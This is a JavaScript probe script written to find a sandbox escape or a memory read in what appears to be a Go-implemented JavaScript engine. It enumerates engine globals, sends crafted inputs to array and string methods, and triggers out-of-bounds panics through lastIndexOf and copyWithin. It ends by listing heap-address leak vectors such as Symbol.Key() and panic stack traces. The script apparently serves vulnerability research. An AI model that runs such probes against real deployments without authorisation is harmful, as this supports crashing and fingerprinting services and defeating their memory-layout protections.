// Attempt 5: Engine API enumeration & creative memory probing
// Goal: find any path to read process memory or filesystem

_print("=== Part 1: Enumerate ALL global names ===");
// Get the global object
var globalObj = (function() { return this; })() || (new Function("return this"))();
if (globalObj) {
    var gKeys = Object.getOwnPropertyNames(globalObj);
    _print("  Global object has " + gKeys.length + " own properties:");
    var gi = 0;
    while (gi < gKeys.length) {
        var gv = globalObj[gKeys[gi]];
        var gtype = typeof gv;
        if (gtype === "function" || gtype === "object") {
            _print("    " + gKeys[gi] + " : " + gtype);
        }
        gi++;
    }
} else {
    _print("  Could not get global object");
}

_print("\n=== Part 2: Check for Node.js / engine-specific APIs ===");
var checkNames = [
    "require", "module", "exports", "process", "Buffer",
    "__filename", "__dirname", "global", "globalThis",
    "console", "setTimeout", "setInterval", "clearTimeout",
    "fetch", "XMLHttpRequest", "WebSocket",
    "Deno", "Bun", "importScripts",
    "print", "_print", "readline", "read", "readFile",
    "load", "loadScript", "quit", "exit",
    "$262", "createRealm", "detachArrayBuffer",
    "gc", "drainJobQueue", "evalScript"
];
var ci = 0;
while (ci < checkNames.length) {
    try {
        var val = eval(checkNames[ci]);
        _print("  " + checkNames[ci] + " = " + typeof val);
    } catch(e) {
        // not defined
    }
    ci++;
}

_print("\n=== Part 3: Function constructor code execution ===");
try {
    // Can we access the global scope through Function constructor?
    var fn = new Function("return typeof process !== 'undefined' ? process : 'no process'");
    _print("  Function('return process'): " + fn());

    // Can we access Go-level functions?
    var fn2 = new Function("return typeof _print");
    _print("  Function('typeof _print'): " + fn2());

    // Try to eval code that accesses internals
    var fn3 = new Function("return Object.getOwnPropertyNames(this)");
    var thisKeys = fn3.call(globalObj);
    _print("  this keys count: " + thisKeys.length);
} catch(e) {
    _print("  Function constructor error: " + e);
}

_print("\n=== Part 4: Probe for hidden native methods ===");
// Check all builtin prototypes for unusual methods
var protos = {
    "Object.prototype": Object.prototype,
    "Function.prototype": Function.prototype,
    "Array.prototype": Array.prototype,
    "String.prototype": String.prototype,
    "Number.prototype": Number.prototype,
    "RegExp.prototype": RegExp.prototype,
    "Error.prototype": Error.prototype,
};
var pnames = Object.getOwnPropertyNames(protos);
var pi = 0;
while (pi < pnames.length) {
    var pName = pnames[pi];
    var proto = protos[pName];
    var protoKeys = Object.getOwnPropertyNames(proto);
    var unusual = [];
    var pki = 0;
    while (pki < protoKeys.length) {
        var pk = protoKeys[pki];
        // Check for unusual keys (containing 0x, @@, internal, etc.)
        if (pk.indexOf("0x") >= 0 || pk.indexOf("@@sym") >= 0 || pk.indexOf("internal") >= 0 || pk.indexOf("native") >= 0) {
            unusual.push(pk);
        }
        pki++;
    }
    if (unusual.length > 0) {
        _print("  [!] " + pName + " unusual keys: " + unusual.join(", "));
    }
    pi++;
}

_print("\n=== Part 5: WeakRef / FinalizationRegistry (GC primitives) ===");
try {
    if (typeof WeakRef !== "undefined") {
        _print("  WeakRef available");
        // WeakRef.deref after GC could reveal if object was collected
        var target5 = {};
        var wr = new WeakRef(target5);
        _print("  WeakRef.deref: " + wr.deref());
    } else {
        _print("  WeakRef: not available");
    }
} catch(e) {
    _print("  WeakRef error: " + e);
}

_print("\n=== Part 6: ArrayData cap vs len probe ===");
// After pop(), Go slice has cap > len. If we push back,
// does append reuse the backing array or allocate new?
try {
    // Create array, pop, then check if push sees old data
    var arr6 = [];
    // Fill with identifiable values
    var fi = 0;
    while (fi < 10) {
        arr6.push("sentinel_" + fi);
        fi++;
    }
    _print("  Before: length=" + arr6.length);

    // Pop all elements (shrinks len but keeps cap)
    while (arr6.length > 0) {
        arr6.pop();
    }
    _print("  After pop all: length=" + arr6.length);

    // Now push undefined values — does append reuse the old backing array?
    // If so, the old pointers are overwritten with new values
    // But what if we push FEWER elements? The old elements beyond
    // the new length are still in the capacity
    arr6.push("new_0");
    arr6.push("new_1");
    _print("  After 2 pushes: length=" + arr6.length);
    _print("  arr6[0]=" + arr6[0] + " arr6[1]=" + arr6[1]);

    // The elements at indices 2-9 are in the Go backing array's capacity
    // but not accessible through arr6[i] because i >= len(ArrayData)
    _print("  arr6[2]=" + arr6[2]); // should be undefined (beyond len)
    _print("  arr6[9]=" + arr6[9]); // should be undefined (beyond len)

    // What about using splice to grow?
    // splice with insert but no delete extends the array
    var arr6b = ["a", "b", "c", "d", "e"];
    arr6b.pop(); // Now cap >= 5, len = 4
    arr6b.pop(); // cap >= 5, len = 3
    // arr6b is now ["a", "b", "c"] with cap >= 5
    // Elements "d" and "e" (pointers to Value structs) are in cap

    // Can we use slice method to access beyond len?
    // The builtins' arraySlice uses len(obj.ArrayData) not cap
    var sliced = arr6b.slice(0, 10);
    _print("  slice(0,10) on 3-elem array: length=" + sliced.length);
    // Expected: 3 (clamped to len)
} catch(e) {
    _print("  ArrayData probe error: " + e);
}

_print("\n=== Part 7: Direct Go panic trigger for stack trace ===");
// In CLI mode (no recover), a panic prints full Go stack with heap addrs
// The key vectors that cause panics:
_print("  Panic vectors (DO NOT run in CLI without redirect):");
_print("  1. arr.copyWithin(0, 1e18, 1e18+100) → slice OOB");
_print("  2. 'x'.lastIndexOf('xx', 0) → string slice OOB");
_print("  3. Deep recursion → stack overflow");

// Can we trigger a panic that's caught by try/catch?
// No — Go panics bypass JS exception handling
// But in test runner, recover() catches them

// Let's try to crash in a way that puts interesting data in the panic
try {
    // lastIndexOf OOB — this is the confirmed bug
    "test".lastIndexOf("testing_long_search_string", 0);
    _print("  lastIndexOf survived (unexpected - maybe fixed?)");
} catch(e) {
    _print("  lastIndexOf error: " + e);
}

_print("\n=== Part 8: String concatenation oracle ===");
// When Go strings are concatenated, the runtime may copy or share
// backing arrays. Can we detect this through timing?
try {
    var base = "A".repeat(1000);
    var parts = [];
    var pi2 = 0;
    while (pi2 < 100) {
        parts.push(base.substring(pi2 * 10, pi2 * 10 + 10));
        pi2++;
    }
    // All these substrings share the same Go backing array
    // But we can't observe this from JS
    _print("  Created " + parts.length + " substrings");
    _print("  Total unique chars: all 'A' (can't distinguish backing)");
} catch(e) {
    _print("  String oracle error: " + e);
}

_print("\n=== Part 9: Attempt memory read via lastIndexOf crash ===");
// The lastIndexOf bug at builtins/string.go:179 does:
//   s[:pos+len(search)]
// where pos can be up to len(s) and len(search) can be large
// This reads pos+len(search) bytes from the Go string's backing array
// But the PANIC prevents the data from being returned

// HOWEVER: what if search is a substring of s, and the shared
// backing array means s[:pos+len(search)] is actually valid?
try {
    // Create a large string
    var bigStr = "AABBCCDDEE".repeat(100); // 1000 chars
    // Create a search string that is a suffix/substring
    var search9 = bigStr.substring(500, 1000); // last 500 chars

    // Now: bigStr and search9 may share the same Go backing array
    // bigStr.lastIndexOf(search9, 0):
    //   pos = 0, len(search) = 500
    //   s[:0+500] = s[:500] → valid (within bigStr)
    // This won't crash because pos + len(search) = 500 <= len(bigStr)=1000

    var result9 = bigStr.lastIndexOf(search9, 0);
    _print("  lastIndexOf(substr, 0): " + result9);

    // What about a search string LONGER than the source?
    var shortStr = "ABC";
    var longSearch = "ABCDEFGHIJ";
    // pos=0, len(search)=10, s[:0+10]=s[:10] → crash since len(s)=3
    try {
        var result9b = shortStr.lastIndexOf(longSearch, 0);
        _print("  shortStr.lastIndexOf(longSearch, 0): " + result9b);
    } catch(e9) {
        _print("  crash avoided (caught as error): " + e9);
    }
} catch(e) {
    _print("  lastIndexOf memory error: " + e);
}

_print("\n=== Part 10: Summary of confirmed info leak vectors ===");
_print("  1. Symbol.Key() → heap addresses via @@sym(desc)@0xADDR");
_print("  2. Error messages include Symbol keys with addresses");
_print("  3. JSON.stringify serializes Symbol keys with addresses");
_print("  4. Go panic stack traces leak heap addrs + source paths");
_print("  5. 24-byte allocation stride reveals Go size class");
_print("  6. Go regexp error messages reveal engine internals");
_print("  7. Number formatting via %g fingerprints Go runtime");

_print("\n=== CONCLUSION ===");
_print("  Go's memory safety model (bounds-checked slices/strings,");
_print("  zero-initialized allocations, GC preventing UAF, no unsafe)");
_print("  prevents true arbitrary memory reads from safe code.");
_print("  The best primitive available is HEAP ADDRESS LEAK via Symbol.Key().");

_print("\n=== DONE ===");
